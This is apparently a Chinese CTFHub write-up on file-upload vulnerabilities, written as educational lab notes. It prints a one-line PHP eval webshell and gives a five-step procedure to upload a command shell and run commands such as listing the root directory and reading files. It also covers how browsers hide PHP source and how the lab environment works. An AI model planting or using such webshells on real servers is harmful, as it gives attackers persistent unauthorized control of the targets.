### 📌 今日硬核知识点

**1. 文件上传漏洞的本质：服务器太信任你传的东西**

网站都有上传功能——换头像、传附件、交作业。正常流程应该是：

```
你选一张图 → 服务器检查"是不是图片" → 存到 /uploads/
```

但如果服务器**不检查**，或者检查得很水：

```
你传一个 shell.php（不是图片，是代码）
服务器：哦，存到 /uploads/ 了
你访问 /uploads/shell.php
服务器：好，执行这段代码
```

**关键点**：服务器不仅"收"了你的文件，还把它**当程序执行**了。这不是"上传文件"，这是"往服务器里塞了一个能运行的程序"。

**2. webshell：一个文件就是一个后门**

上传的那个 php 文件，在安全圈有个名字叫 **webshell**（网页后门）。

真实攻击里最常见的是"一句话木马"：

```php
<?php @eval($_POST['cmd']); ?>
```

这几行代码的意思是："把 POST 请求里 `cmd` 参数的内容，当成 PHP 代码执行"。攻击者用蚁剑、菜刀这类工具连上它，就能像操作自己电脑一样操作目标服务器——**长期控制，不是只读一个文件**。

**3. 五步基础打法：文件上传题的通用套路**

```
第 1 步：看表单
        看上传页面有没有提示（限不限类型、大小、后缀）

第 2 步：传"探针"
        传一个 test.php（内容：echo "hello"）
        访问 → 显示 hello = 服务器确实在帮你执行代码

第 3 步：传"万能 shell"
        传 shell.php（执行 URL 里 ?c= 参数的命令）

第 4 步：找 flag
        ?c=ls /                      列根目录
        ?c=find / -name "flag*"      搜 flag 文件

第 5 步：读出来
        ?c=cat /path/to/flag
```

**这套打法的精髓**：先验证「能不能执行」，再验证「能不能执行命令」，最后才是「拿 flag」。三步验证，缺一步都可能是白忙。

**4. 浏览器会"吞"尖括号：显示空白 ≠ 没有内容**

服务器返回的是：

```html
<pre><?php // ctfhub{648c1464145e7a0a86cc7b48}
</pre>
```

浏览器一看 `<?php`，把 `<` 当成了 HTML 标签的开头，直接当标签解析 → **页面上什么都不显示**。

这不是 bug，是浏览器的本职工作（它只认 HTML 标签）。要看真实内容，必须用 **Ctrl+U 查看网页源代码**，或者右键 → 查看源代码。

**5. 直接访问 php ≠ 看到源码**

| 操作 | 结果 |
|---|---|
| 浏览器访问 `flag_xxx.php` | 服务器**执行** PHP，如果内容是注释就输出空白 |
| 用 `cat` 命令读它 | 拿到**原始文本**，能看到 `<?php // flag` 这种源码 |

**为什么**：PHP 文件被访问时，服务器会先执行再输出；而 `cat` 是直接读文件字节，不经过 PHP 解析器。

**6. CTFHub 的两个机制**

- **答对即销毁**：提交正确 flag 后，靶场容器自动关闭（相当于交卷锁考场），想重做必须重开环境
- **flag 随机生成**：每个环境生成的 flag 不同，抄别人 writeup 的 flag 可能对不上
